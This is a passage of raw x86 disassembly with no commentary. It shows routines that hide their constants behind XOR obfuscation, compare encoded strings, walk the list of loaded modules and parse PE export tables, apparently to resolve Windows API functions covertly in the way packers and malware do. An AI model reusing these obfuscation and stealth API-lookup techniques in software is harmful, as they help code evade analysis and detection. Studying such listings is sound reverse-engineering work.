  42623c:	cmp    DWORD PTR [ebp+0x8],ebx
  42623f:	jb     0x42624d
  426241:	mov    ebx,DWORD PTR [eax+0x8]
  426244:	add    ebx,ecx
  426246:	add    ebx,esi
  426248:	cmp    DWORD PTR [ebp+0x8],ebx
  42624b:	jb     0x426257
  42624d:	add    eax,0x28
  426250:	inc    edi
  426251:	cmp    edi,edx
  426253:	jb     0x426236
  426255:	xor    eax,eax
  426257:	pop    edi
  426258:	pop    ebx
  426259:	pop    ebp
  42625a:	ret    0x4
  42625d:	push   ebp
  42625e:	mov    ebp,esp
  426260:	sub    esp,0x34
  426263:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  42626a:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  426271:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  426278:	mov    DWORD PTR [ebp-0x8],0xf89c85d1
  42627f:	mov    DWORD PTR [ebp-0x20],0xf89c85f1
  426286:	mov    DWORD PTR [ebp-0x2c],0xf89c852a
  42628d:	mov    DWORD PTR [ebp-0x2c],0xf89c85ca
  426294:	mov    DWORD PTR [ebp-0x10],eax
  426297:	mov    eax,DWORD PTR [ebp+0x8]
  42629a:	mov    DWORD PTR [ebp-0x14],eax
  42629d:	mov    eax,DWORD PTR [ebp-0xc]
  4262a0:	push   ebx
  4262a1:	mov    ecx,0x75108a4
  4262a6:	xor    eax,ecx
  4262a8:	push   esi
  4262a9:	mov    esi,DWORD PTR [ebp-0x10]
  4262ac:	mov    edx,0x3272ec
  4262b1:	add    eax,edx
  4262b3:	push   edi
  4262b4:	cmp    esi,eax
  4262b6:	je     0x426495
  4262bc:	mov    eax,DWORD PTR [ebp-0xc]
  4262bf:	mov    esi,DWORD PTR [ebp-0x14]
  4262c2:	xor    eax,ecx
  4262c4:	add    eax,edx
  4262c6:	cmp    esi,eax
  4262c8:	je     0x426495
  4262ce:	mov    eax,DWORD PTR [ebp-0xc]
  4262d1:	xor    eax,ecx
  4262d3:	add    eax,edx
  4262d5:	mov    DWORD PTR [ebp-0x24],eax
  4262d8:	mov    eax,DWORD PTR [ebp-0xc]
  4262db:	xor    eax,ecx
  4262dd:	add    eax,edx
  4262df:	mov    DWORD PTR [ebp-0x28],eax
  4262e2:	mov    edi,DWORD PTR [ebp-0x20]
  4262e5:	mov    ebx,DWORD PTR [ebp-0x8]
  4262e8:	mov    esi,0x8a4
  4262ed:	xor    edi,esi
  4262ef:	mov    eax,0x72ec
  4262f4:	xor    ebx,esi
  4262f6:	add    edi,eax
  4262f8:	add    ebx,eax
  4262fa:	sub    ebx,edi
  4262fc:	mov    WORD PTR [ebp-0x8],bx
  426300:	jmp    0x4263c5
  426305:	mov    edi,DWORD PTR [ebp-0xc]
  426308:	mov    bx,WORD PTR [ebp-0x4]
  42630c:	xor    edi,esi
  42630e:	add    edi,eax
  426310:	cmp    bx,di
  426313:	je     0x426407
  426319:	mov    edi,DWORD PTR [ebp-0xc]
  42631c:	mov    ebx,DWORD PTR [ebp+0xc]
  42631f:	xor    edi,ecx
  426321:	add    edi,edx
  426323:	cmp    ebx,edi
  426325:	mov    di,WORD PTR [ebp-0x4]
  426329:	mov    bx,WORD PTR [ebp+0x8]
  42632d:	je     0x426398
  42632f:	cmp    bx,di
  426332:	je     0x4263a1
  426334:	mov    edi,DWORD PTR [ebp-0x20]
  426337:	mov    bx,WORD PTR [ebp+0x8]
  42633b:	xor    edi,esi
  42633d:	add    edi,eax
  42633f:	cmp    bx,di
  426342:	jb     0x426362
  426344:	mov    edi,DWORD PTR [ebp-0x2c]
  426347:	mov    bx,WORD PTR [ebp+0x8]
  42634b:	xor    edi,esi
  42634d:	add    edi,eax
  42634f:	cmp    bx,di
  426352:	ja     0x426362
  426354:	movzx  edi,WORD PTR [ebp+0x8]
  426358:	movzx  ebx,WORD PTR [ebp-0x8]
  42635c:	add    edi,ebx
  42635e:	mov    WORD PTR [ebp+0x8],di
  426362:	mov    edi,DWORD PTR [ebp-0x20]
  426365:	mov    bx,WORD PTR [ebp-0x4]
  426369:	xor    edi,esi
  42636b:	add    edi,eax
  42636d:	cmp    bx,di
  426370:	jb     0x426390
  426372:	mov    edi,DWORD PTR [ebp-0x2c]
  426375:	mov    bx,WORD PTR [ebp-0x4]
  426379:	xor    edi,esi
  42637b:	add    edi,eax
  42637d:	cmp    bx,di
  426380:	ja     0x426390
  426382:	movzx  edi,WORD PTR [ebp-0x4]
  426386:	movzx  ebx,WORD PTR [ebp-0x8]
  42638a:	add    edi,ebx
  42638c:	mov    WORD PTR [ebp-0x4],di
  426390:	mov    di,WORD PTR [ebp-0x4]
  426394:	mov    bx,WORD PTR [ebp+0x8]
  426398:	cmp    bx,di
  42639b:	jne    0x426495
  4263a1:	mov    edi,DWORD PTR [ebp-0x1c]
  4263a4:	mov    ebx,DWORD PTR [ebp-0x10]
  4263a7:	xor    edi,ecx
  4263a9:	lea    edi,[edi+ebx*1+0x3272ec]
  4263b0:	mov    DWORD PTR [ebp-0x10],edi
  4263b3:	mov    edi,DWORD PTR [ebp-0x1c]
  4263b6:	mov    ebx,DWORD PTR [ebp-0x14]
  4263b9:	xor    edi,ecx
  4263bb:	lea    edi,[edi+ebx*1+0x3272ec]
  4263c2:	mov    DWORD PTR [ebp-0x14],edi
  4263c5:	mov    edi,DWORD PTR [ebp-0x24]
  4263c8:	mov    ebx,DWORD PTR [ebp-0x10]
  4263cb:	mov    di,WORD PTR [ebx+edi*2]
  4263cf:	mov    WORD PTR [ebp+0x8],di
  4263d3:	mov    edi,DWORD PTR [ebp-0x28]
  4263d6:	mov    ebx,DWORD PTR [ebp-0x14]
  4263d9:	mov    di,WORD PTR [ebx+edi*2]
  4263dd:	mov    WORD PTR [ebp-0x4],di
  4263e1:	mov    edi,DWORD PTR [ebp-0xc]
  4263e4:	mov    bx,WORD PTR [ebp+0x8]
  4263e8:	xor    edi,esi
  4263ea:	add    edi,eax
  4263ec:	cmp    bx,di
  4263ef:	jne    0x426305
  4263f5:	mov    eax,DWORD PTR [ebp-0x18]
  4263f8:	mov    esi,DWORD PTR [ebp-0xc]
  4263fb:	xor    eax,ecx
  4263fd:	add    eax,edx
  4263ff:	imul   eax,esi
  426402:	mov    DWORD PTR [ebp-0xc],eax
  426405:	jmp    0x426419
  426407:	mov    eax,DWORD PTR [ebp-0xc]
  42640a:	mov    esi,DWORD PTR [ebp-0x18]
  42640d:	xor    eax,ecx
  42640f:	lea    eax,[eax+esi*1+0x3272ec]
  426416:	mov    DWORD PTR [ebp-0x18],eax
  426419:	mov    eax,DWORD PTR [ebp-0x24]
  42641c:	sub    eax,edx
  42641e:	xor    eax,ecx
  426420:	mov    DWORD PTR [ebp-0x30],eax
  426423:	mov    eax,DWORD PTR [ebp-0x28]
  426426:	sub    eax,edx
  426428:	xor    eax,ecx
  42642a:	mov    DWORD PTR [ebp-0x34],eax
  42642d:	mov    eax,DWORD PTR [ebp-0x34]
  426430:	mov    esi,DWORD PTR [ebp-0x1c]
  426433:	xor    esi,ecx
  426435:	add    esi,edx
  426437:	xor    eax,ecx
  426439:	add    eax,0x3272ec
  42643e:	imul   esi,eax
  426441:	mov    eax,DWORD PTR [ebp-0x14]
  426444:	movzx  eax,WORD PTR [esi+eax*1]
  426448:	mov    esi,DWORD PTR [ebp-0x30]
  42644b:	mov    edi,DWORD PTR [ebp-0x1c]
  42644e:	xor    esi,ecx
  426450:	add    esi,edx
  426452:	xor    edi,ecx
  426454:	add    edi,edx
  426456:	imul   edi,esi
  426459:	mov    esi,DWORD PTR [ebp-0x10]
  42645c:	movzx  esi,WORD PTR [edi+esi*1]
  426460:	sub    eax,edx
  426462:	sub    esi,edx
  426464:	xor    eax,ecx
  426466:	xor    esi,ecx
  426468:	cmp    esi,eax
  42646a:	jne    0x426495
  42646c:	mov    eax,DWORD PTR [ebp-0x30]
  42646f:	mov    esi,DWORD PTR [ebp-0x1c]
  426472:	xor    eax,ecx
  426474:	add    eax,0x3272ec
  426479:	xor    esi,ecx
  42647b:	add    esi,edx
  42647d:	imul   esi,eax
  426480:	mov    eax,DWORD PTR [ebp-0x10]
  426483:	movzx  eax,WORD PTR [esi+eax*1]
  426487:	mov    esi,DWORD PTR [ebp-0xc]
  42648a:	sub    eax,edx
  42648c:	xor    eax,ecx
  42648e:	cmp    eax,esi
  426490:	mov    eax,DWORD PTR [ebp-0xc]
  426493:	je     0x426498
  426495:	mov    eax,DWORD PTR [ebp-0x18]
  426498:	pop    edi
  426499:	xor    eax,ecx
  42649b:	pop    esi
  42649c:	add    eax,edx
  42649e:	pop    ebx
  42649f:	leave  
  4264a0:	ret    0x8
  4264a3:	push   ebp
  4264a4:	mov    ebp,esp
  4264a6:	push   ecx
  4264a7:	mov    cx,WORD PTR [eax]
  4264aa:	push   esi
  4264ab:	mov    esi,0x3b56
  4264b0:	sub    cx,si
  4264b3:	mov    esi,0x8a94
  4264b8:	xor    cx,si
  4264bb:	mov    esi,0x4e3e
  4264c0:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4264c7:	mov    edx,0xf89c85b0
  4264cc:	cmp    cx,si
  4264cf:	je     0x42652e
  4264d1:	push   ebx
  4264d2:	push   edi
  4264d3:	movzx  ecx,cx
  4264d6:	mov    edi,0xffcd8d14
  4264db:	mov    esi,0x75108a4
  4264e0:	mov    ebx,0x4f92
  4264e5:	cmp    cx,bx
  4264e8:	jne    0x4264ed
  4264ea:	mov    DWORD PTR [ebp-0x4],edx
  4264ed:	lea    edx,[edi+0x1]
  4264f0:	xor    edx,esi
  4264f2:	mov    edi,edx
  4264f4:	xor    edi,esi
  4264f6:	mov    cx,WORD PTR [eax+edi*2+0x64e5d8]
  4264fe:	mov    ebx,0x3b56
  426503:	sub    cx,bx
  426506:	mov    ebx,0x8a94
  42650b:	xor    cx,bx
  42650e:	mov    ebx,0x4e3e
  426513:	cmp    cx,bx
  426516:	jne    0x4264e0
  426518:	mov    ecx,DWORD PTR [ebp-0x4]
  42651b:	pop    edi
  42651c:	pop    ebx
  42651d:	cmp    ecx,0xf89c85b7
  426523:	je     0x42652e
  426525:	xor    ecx,esi
  426527:	lea    eax,[eax+ecx*2+0x64e5da]
  42652e:	pop    esi
  42652f:	leave  
  426530:	ret    
  426531:	push   ebp
  426532:	mov    ebp,esp
  426534:	push   ecx
  426535:	push   esi
  426536:	push   edi
  426537:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  42653e:	mov    esi,0xf89c85b0
  426543:	call   0x4264a3
  426548:	mov    edi,eax
  42654a:	mov    al,BYTE PTR [edi]
  42654c:	add    al,0x3
  42654e:	xor    al,0x79
  426550:	cmp    al,0x7a
  426552:	je     0x4265b5
  426554:	mov    eax,edi
  426556:	mov    edx,0xffcd8d14
  42655b:	mov    ecx,0x75108a4
  426560:	push   ebx
  426561:	mov    ax,WORD PTR [eax]
  426564:	mov    ebx,0x3b56
  426569:	sub    ax,bx
  42656c:	mov    ebx,0x8a94
  426571:	xor    ax,bx
  426574:	mov    ebx,0x4e4c
  426579:	cmp    ax,bx
  42657c:	jne    0x426581
  42657e:	mov    DWORD PTR [ebp-0x4],esi
  426581:	lea    esi,[edx+0x1]
  426584:	xor    esi,ecx
  426586:	mov    edx,esi
  426588:	xor    edx,ecx
  42658a:	lea    eax,[edi+edx*2+0x64e5d8]
  426591:	mov    bl,BYTE PTR [eax]
  426593:	add    bl,0x3
  426596:	xor    bl,0x79
  426599:	cmp    bl,0x7a
  42659c:	jne    0x426561
  42659e:	mov    eax,DWORD PTR [ebp-0x4]
  4265a1:	pop    ebx
  4265a2:	cmp    eax,0xf89c85b7
  4265a7:	je     0x4265b5
  4265a9:	xor    eax,ecx
  4265ab:	xor    ecx,ecx
  4265ad:	mov    WORD PTR [edi+eax*2+0x64e5d8],cx
  4265b5:	mov    eax,edi
  4265b7:	pop    edi
  4265b8:	pop    esi
  4265b9:	leave  
  4265ba:	ret    
  4265bb:	push   ebp
  4265bc:	mov    ebp,esp
  4265be:	push   ecx
  4265bf:	push   esi
  4265c0:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4265c7:	mov    esi,0xf89c85b0
  4265cc:	call   0x4264a3
  4265d1:	mov    cx,WORD PTR [eax]
  4265d4:	mov    edx,0x3b56
  4265d9:	sub    cx,dx
  4265dc:	mov    edx,0x8a94
  4265e1:	xor    cx,dx
  4265e4:	mov    edx,0x4e3e
  4265e9:	cmp    cx,dx
  4265ec:	je     0x426645
  4265ee:	push   ebx
  4265ef:	push   edi
  4265f0:	movzx  ecx,cx
  4265f3:	mov    edx,0xffcd8d14
  4265f8:	mov    edi,0x75108a4
  4265fd:	mov    ebx,0x4e4c
  426602:	cmp    cx,bx
  426605:	jne    0x42660a
  426607:	mov    DWORD PTR [ebp-0x4],esi
  42660a:	lea    esi,[edx+0x1]
  42660d:	xor    esi,edi
  42660f:	mov    edx,esi
  426611:	xor    edx,edi
  426613:	mov    cx,WORD PTR [eax+edx*2+0x64e5d8]
  42661b:	mov    ebx,0x3b56
  426620:	sub    cx,bx
  426623:	mov    ebx,0x8a94
  426628:	xor    cx,bx
  42662b:	mov    ebx,0x4e3e
  426630:	cmp    cx,bx
  426633:	jne    0x4265fd
  426635:	cmp    DWORD PTR [ebp-0x4],0xf89c85b7
  42663c:	pop    edi
  42663d:	pop    ebx
  42663e:	je     0x426645
  426640:	xor    eax,eax
  426642:	inc    eax
  426643:	jmp    0x426647
  426645:	xor    eax,eax
  426647:	pop    esi
  426648:	leave  
  426649:	ret    
  42664a:	push   ebp
  42664b:	mov    ebp,esp
  42664d:	push   ecx
  42664e:	mov    eax,DWORD PTR [ebp+0x8]
  426651:	movzx  ecx,WORD PTR [eax]
  426654:	push   esi
  426655:	lea    eax,[ecx-0x3b56]
  42665b:	mov    esi,0x8a94
  426660:	push   edi
  426661:	xor    eax,esi
  426663:	mov    edi,0x4e3e
  426668:	mov    DWORD PTR [ebp-0x4],edx
  42666b:	cmp    ax,di
  42666e:	je     0x42669b
  426670:	mov    eax,DWORD PTR [ebp+0x8]
  426673:	sub    eax,edx
  426675:	mov    DWORD PTR [ebp+0x8],eax
  426678:	jmp    0x42667d
  42667a:	mov    eax,DWORD PTR [ebp+0x8]
  42667d:	mov    WORD PTR [edx],cx
  426680:	add    edx,0x2
  426683:	movzx  edi,WORD PTR [eax+edx*1]
  426687:	mov    ecx,edi
  426689:	add    edi,0xffffc4aa
  42668f:	xor    edi,esi
  426691:	mov    eax,0x4e3e
  426696:	cmp    di,ax
  426699:	jne    0x42667a
  42669b:	xor    eax,eax
  42669d:	pop    edi
  42669e:	mov    WORD PTR [edx],ax
  4266a1:	mov    eax,DWORD PTR [ebp-0x4]
  4266a4:	pop    esi
  4266a5:	leave  
  4266a6:	ret    0x4
  4266a9:	push   ebp
  4266aa:	mov    ebp,esp
  4266ac:	sub    esp,0x18
  4266af:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  4266b6:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  4266bd:	mov    ecx,DWORD PTR [ebp-0x8]
  4266c0:	push   esi
  4266c1:	mov    eax,0x75108a4
  4266c6:	xor    ecx,eax
  4266c8:	mov    esi,0x3272ec
  4266cd:	add    ecx,esi
  4266cf:	mov    DWORD PTR [ebp-0x4],ecx
  4266d2:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4266d9:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  4266e0:	push   edi
  4266e1:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4266e8:	jmp    0x426789
  4266ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4266f0:	mov    edx,DWORD PTR [ebp+0x10]
  4266f3:	sub    edx,ecx
  4266f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4266f8:	xor    ecx,eax
  4266fa:	add    ecx,esi
  4266fc:	cmp    edx,ecx
  4266fe:	jbe    0x42671b
  426700:	mov    edx,DWORD PTR [ebp-0x4]
  426703:	add    edx,DWORD PTR [ebp+0x8]
  426706:	mov    ecx,DWORD PTR [ebp-0x4]
  426709:	add    ecx,DWORD PTR [ebp+0xc]
  42670c:	mov    edi,DWORD PTR [ecx]
  42670e:	mov    DWORD PTR [edx],edi
  426710:	mov    ecx,DWORD PTR [ecx+0x4]
  426713:	mov    DWORD PTR [edx+0x4],ecx
  426716:	mov    ecx,DWORD PTR [ebp-0xc]
  426719:	jmp    0x426768
  42671b:	mov    ecx,DWORD PTR [ebp-0x4]
  42671e:	mov    edx,DWORD PTR [ebp+0x10]
  426721:	sub    edx,ecx
  426723:	mov    ecx,DWORD PTR [ebp-0x10]
  426726:	xor    ecx,eax
  426728:	add    ecx,esi
  42672a:	cmp    edx,ecx
  42672c:	mov    ecx,DWORD PTR [ebp-0x4]
  42672f:	jbe    0x426743
  426731:	add    ecx,DWORD PTR [ebp+0x8]
  426734:	mov    edx,DWORD PTR [ebp-0x4]
  426737:	add    edx,DWORD PTR [ebp+0xc]
  42673a:	mov    edx,DWORD PTR [edx]
  42673c:	mov    DWORD PTR [ecx],edx
  42673e:	mov    ecx,DWORD PTR [ebp-0x10]
  426741:	jmp    0x426768
  426743:	mov    edx,DWORD PTR [ebp+0x10]
  426746:	sub    edx,ecx
  426748:	mov    ecx,DWORD PTR [ebp-0x14]
  42674b:	xor    ecx,eax
  42674d:	add    ecx,esi
  42674f:	cmp    edx,ecx
  426751:	mov    ecx,DWORD PTR [ebp-0x4]
  426754:	jbe    0x426779
  426756:	add    ecx,DWORD PTR [ebp+0x8]
  426759:	mov    edx,DWORD PTR [ebp-0x4]
  42675c:	add    edx,DWORD PTR [ebp+0xc]
  42675f:	mov    dx,WORD PTR [edx]
  426762:	mov    WORD PTR [ecx],dx
  426765:	mov    ecx,DWORD PTR [ebp-0x14]
  426768:	mov    edx,DWORD PTR [ebp-0x4]
  42676b:	xor    ecx,eax
  42676d:	lea    ecx,[ecx+edx*1+0x3272ec]
  426774:	mov    DWORD PTR [ebp-0x4],ecx
  426777:	jmp    0x426789
  426779:	add    ecx,DWORD PTR [ebp+0x8]
  42677c:	mov    edx,DWORD PTR [ebp-0x4]
  42677f:	add    edx,DWORD PTR [ebp+0xc]
  426782:	mov    dl,BYTE PTR [edx]
  426784:	mov    BYTE PTR [ecx],dl
  426786:	inc    DWORD PTR [ebp-0x4]
  426789:	mov    ecx,DWORD PTR [ebp-0x18]
  42678c:	mov    edx,DWORD PTR [ebp+0x10]
  42678f:	xor    ecx,eax
  426791:	add    ecx,esi
  426793:	imul   ecx,edx
  426796:	mov    edx,DWORD PTR [ebp-0x8]
  426799:	mov    edi,DWORD PTR [ebp-0x4]
  42679c:	xor    edx,eax
  42679e:	lea    edx,[edx+edi*1+0x3272ec]
  4267a5:	cmp    edx,ecx
  4267a7:	jb     0x4266ed
  4267ad:	pop    edi
  4267ae:	pop    esi
  4267af:	leave  
  4267b0:	ret    0xc
  4267b3:	push   ebp
  4267b4:	mov    ebp,esp
  4267b6:	sub    esp,0xc
  4267b9:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4267c0:	push   esi
  4267c1:	mov    esi,eax
  4267c3:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4267ca:	mov    edx,DWORD PTR [ebp-0x4]
  4267cd:	mov    eax,0x75108a4
  4267d2:	xor    edx,eax
  4267d4:	mov    ecx,0x3272ec
  4267d9:	add    edx,ecx
  4267db:	cmp    esi,edx
  4267dd:	je     0x42681f
  4267df:	push   ebx
  4267e0:	push   edi
  4267e1:	mov    edx,DWORD PTR [ebp-0x8]
  4267e4:	mov    ebx,DWORD PTR [ebp+0x8]
  4267e7:	xor    edx,eax
  4267e9:	mov    edi,0xffcd8d14
  4267ee:	sub    edi,edx
  4267f0:	add    esi,edi
  4267f2:	lea    edx,[esi-0x3272ec]
  4267f8:	xor    edx,eax
  4267fa:	mov    DWORD PTR [ebp-0xc],edx
  4267fd:	mov    edx,DWORD PTR [ebp-0x4]
  426800:	mov    edi,DWORD PTR [ebp-0xc]
  426803:	xor    dl,0xa4
  426806:	sub    dl,0x14
  426809:	xor    edi,eax
  42680b:	mov    BYTE PTR [edi+ebx*1+0x3272ec],dl
  426812:	mov    edx,DWORD PTR [ebp-0x4]
  426815:	xor    edx,eax
  426817:	add    edx,ecx
  426819:	cmp    esi,edx
  42681b:	jne    0x4267e1
  42681d:	pop    edi
  42681e:	pop    ebx
  42681f:	pop    esi
  426820:	leave  
  426821:	ret    0x4
  426824:	push   ebp
  426825:	mov    ebp,esp
  426827:	sub    esp,0x21c
  42682d:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426834:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  42683b:	mov    eax,DWORD PTR [ebp+0x10]
  42683e:	mov    eax,DWORD PTR [ebp-0x4]
  426841:	mov    ecx,DWORD PTR [ebp+0x8]
  426844:	push   esi
  426845:	push   edi
  426846:	mov    edi,0x75108a4
  42684b:	xor    eax,edi
  42684d:	mov    esi,0x3272ec
  426852:	add    eax,esi
  426854:	cmp    eax,ecx
  426856:	mov    eax,DWORD PTR [ebp-0x4]
  426859:	jne    0x426864
  42685b:	xor    eax,edi
  42685d:	add    eax,esi
  42685f:	jmp    0x426910
  426864:	mov    ecx,DWORD PTR [ebp+0xc]
  426867:	xor    eax,edi
  426869:	add    eax,esi
  42686b:	cmp    eax,ecx
  42686d:	jne    0x426874
  42686f:	mov    eax,DWORD PTR [ebp-0x4]
  426872:	jmp    0x42685b
  426874:	lea    eax,[ebp-0x21c]
  42687a:	mov    DWORD PTR [ebp-0x8],eax
  42687d:	mov    eax,DWORD PTR [ebp+0xc]
  426880:	mov    DWORD PTR [ebp-0x10],eax
  426883:	mov    eax,DWORD PTR [ebp-0x4]
  426886:	xor    eax,edi
  426888:	add    eax,esi
  42688a:	mov    DWORD PTR [ebp+0x10],eax
  42688d:	mov    eax,DWORD PTR [ebp+0xc]
  426890:	push   ebx
  426891:	call   0x4265bb
  426896:	mov    ebx,eax
  426898:	mov    eax,DWORD PTR [ebp+0x8]
  42689b:	mov    eax,DWORD PTR [eax+0x14]
  42689e:	jmp    0x4268f8
  4268a0:	mov    eax,DWORD PTR [ebp+0xc]
  4268a3:	sub    eax,0x8
  4268a6:	mov    DWORD PTR [ebp-0xc],eax
  4268a9:	mov    eax,DWORD PTR [ebp-0xc]
  4268ac:	mov    eax,DWORD PTR [eax+0x28]
  4268af:	call   0x4264a3
  4268b4:	mov    DWORD PTR [ebp+0x10],eax
  4268b7:	push   DWORD PTR [ebp+0x10]
  4268ba:	mov    edx,DWORD PTR [ebp-0x8]
  4268bd:	call   0x42664a
  4268c2:	mov    eax,DWORD PTR [ebp-0x4]
  4268c5:	xor    eax,edi
  4268c7:	add    eax,esi
  4268c9:	cmp    eax,ebx
  4268cb:	jne    0x4268d5
  4268cd:	mov    eax,DWORD PTR [ebp-0x8]
  4268d0:	call   0x426531
  4268d5:	mov    eax,DWORD PTR [ebp-0x14]
  4268d8:	xor    eax,edi
  4268da:	add    eax,esi
  4268dc:	push   eax
  4268dd:	push   DWORD PTR [ebp-0x10]
  4268e0:	mov    eax,DWORD PTR [ebp-0x8]
  4268e3:	call   0x42625d
  4268e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4268eb:	xor    ecx,edi
  4268ed:	add    ecx,esi
  4268ef:	cmp    eax,ecx
  4268f1:	je     0x426916
  4268f3:	mov    eax,DWORD PTR [ebp+0xc]
  4268f6:	mov    eax,DWORD PTR [eax]
  4268f8:	mov    DWORD PTR [ebp+0xc],eax
  4268fb:	mov    eax,DWORD PTR [ebp+0x8]
  4268fe:	mov    ecx,DWORD PTR [ebp+0xc]
  426901:	add    eax,0x14
  426904:	cmp    ecx,eax
  426906:	jne    0x4268a0
  426908:	mov    eax,DWORD PTR [ebp-0x4]
  42690b:	xor    eax,edi
  42690d:	add    eax,esi
  42690f:	pop    ebx
  426910:	pop    edi
  426911:	pop    esi
  426912:	leave  
  426913:	ret    0xc
  426916:	mov    eax,DWORD PTR [ebp-0xc]
  426919:	mov    eax,DWORD PTR [eax+0x18]
  42691c:	jmp    0x42690f
  42691e:	push   ebp
  42691f:	mov    ebp,esp
  426921:	mov    eax,DWORD PTR [ebp+0xc]
  426924:	sub    esp,0x10
  426927:	cmp    DWORD PTR [ebp+0x8],0x0
  42692b:	push   ebx
  42692c:	push   esi
  42692d:	push   edi
  42692e:	je     0x4269e3
  426934:	test   eax,eax
  426936:	je     0x4269e3
  42693c:	movzx  eax,WORD PTR [eax+0x20]
  426940:	mov    ecx,eax
  426942:	mov    DWORD PTR [ebp-0x10],eax
  426945:	xor    edx,edx
  426947:	and    DWORD PTR [ebp-0x8],edx
  42694a:	mov    eax,0x8a94
  42694f:	xor    ecx,eax
  426951:	add    ecx,0x3b56
  426957:	mov    DWORD PTR [ebp-0xc],ecx
  42695a:	and    DWORD PTR [ebp-0x4],0x0
  42695e:	xor    ecx,ecx
  426960:	push   0x7c
  426962:	pop    edi
  426963:	cmp    cx,WORD PTR [ebp-0xc]
  426967:	jae    0x4269cd
  426969:	lea    esi,[edx-0x3b56]
  42696f:	xor    esi,eax
  426971:	movzx  ecx,WORD PTR [ebp-0x4]
  426975:	mov    ebx,DWORD PTR [ebp+0xc]
  426978:	lea    ecx,[ebx+ecx*4]
  42697b:	cmp    WORD PTR [ecx+0x2],si
  42697f:	jne    0x4269b8
  426981:	movzx  ecx,WORD PTR [ecx]
  426984:	mov    edi,0x4e3e
  426989:	cmp    cx,di
  42698c:	jne    0x42699a
  42698e:	mov    ebx,DWORD PTR [ebp+0x8]
  426991:	movzx  edi,dx
  426994:	cmp    BYTE PTR [edi+ebx*1],0x0
  426998:	je     0x4269c7
  42699a:	mov    ebx,DWORD PTR [ebp+0x8]
  42699d:	movzx  edi,dx
  4269a0:	movsx  di,BYTE PTR [edi+ebx*1]
  4269a5:	mov    ebx,0x3b56
  4269aa:	sub    di,bx
  4269ad:	xor    di,ax
  4269b0:	cmp    cx,di
  4269b3:	je     0x4269c7
  4269b5:	push   0x7a
  4269b7:	pop    edi
  4269b8:	inc    DWORD PTR [ebp-0x4]
  4269bb:	mov    cx,WORD PTR [ebp-0xc]
  4269bf:	cmp    WORD PTR [ebp-0x4],cx
  4269c3:	jb     0x426971
  4269c5:	jmp    0x4269cd
  4269c7:	inc    DWORD PTR [ebp-0x8]
  4269ca:	push   0x7d
  4269cc:	pop    edi
  4269cd:	mov    esi,DWORD PTR [ebp+0x8]
  4269d0:	movzx  ecx,dx
  4269d3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4269d7:	je     0x4269ec
  4269d9:	inc    edx
  4269da:	cmp    edi,0x7a
  4269dd:	jne    0x42695a
  4269e3:	xor    eax,eax
  4269e5:	pop    edi
  4269e6:	pop    esi
  4269e7:	pop    ebx
  4269e8:	leave  
  4269e9:	ret    0x8
  4269ec:	mov    ecx,DWORD PTR [ebp-0x8]
  4269ef:	add    ecx,0xffffc4aa
  4269f5:	xor    cx,ax
  4269f8:	xor    eax,eax
  4269fa:	cmp    cx,WORD PTR [ebp-0x10]
  4269fe:	sete   al
  426a01:	jmp    0x4269e5
  426a03:	push   ebp
  426a04:	mov    ebp,esp
  426a06:	sub    esp,0x50
  426a09:	push   edi
  426a0a:	mov    edi,eax
  426a0c:	mov    eax,DWORD PTR [edi+0x1a8]
  426a12:	cmp    DWORD PTR [eax],0x0
  426a15:	jne    0x426a1e
  426a17:	xor    eax,eax
  426a19:	jmp    0x426b4f
  426a1e:	push   DWORD PTR [ebp+0x8]
  426a21:	push   0x2c
  426a23:	pop    eax
  426a24:	call   0x4267b3
  426a29:	mov    edx,DWORD PTR [edi+0x1ac]
  426a2f:	lea    eax,[edi+0x22]
  426a32:	mov    DWORD PTR [ebp-0x4c],eax
  426a35:	lea    eax,[edi+0x44]
  426a38:	mov    DWORD PTR [ebp-0x48],eax
  426a3b:	lea    eax,[edi+0x66]
  426a3e:	mov    DWORD PTR [ebp-0x44],eax
  426a41:	lea    eax,[edi+0x88]
  426a47:	mov    DWORD PTR [ebp-0x40],eax
  426a4a:	lea    eax,[edi+0xaa]
  426a50:	mov    DWORD PTR [ebp-0x3c],eax
  426a53:	lea    eax,[edi+0xcc]
  426a59:	mov    DWORD PTR [ebp-0x38],eax
  426a5c:	lea    eax,[edi+0xee]
  426a62:	mov    DWORD PTR [ebp-0x34],eax
  426a65:	lea    eax,[edi+0x110]
  426a6b:	mov    DWORD PTR [ebp-0x30],eax
  426a6e:	lea    eax,[edi+0x132]
  426a74:	mov    DWORD PTR [ebp-0x2c],eax
  426a77:	lea    eax,[edi+0x154]
  426a7d:	push   edi
  426a7e:	mov    DWORD PTR [ebp-0x50],edi
  426a81:	mov    DWORD PTR [ebp-0x28],eax
  426a84:	call   0x426b83
  426a89:	push   eax
  426a8a:	mov    eax,DWORD PTR [edi+0x1a8]
  426a90:	push   DWORD PTR [eax]
  426a92:	call   0x426824
  426a97:	mov    DWORD PTR [ebp-0x10],eax
  426a9a:	test   eax,eax
  426a9c:	je     0x426b4f
  426aa2:	mov    ecx,DWORD PTR [eax+0x3c]
  426aa5:	push   ebx
  426aa6:	push   esi
  426aa7:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426aab:	add    esi,eax
  426aad:	mov    edi,DWORD PTR [esi+0x24]
  426ab0:	mov    ecx,DWORD PTR [esi+0x1c]
  426ab3:	mov    edx,DWORD PTR [esi+0x20]
  426ab6:	mov    ebx,DWORD PTR [esi+0x18]
  426ab9:	add    edi,eax
  426abb:	mov    DWORD PTR [ebp-0x20],edi
  426abe:	mov    edi,DWORD PTR [esi+0x14]
  426ac1:	add    ecx,eax
  426ac3:	add    edx,eax
  426ac5:	mov    DWORD PTR [ebp-0xc],ecx
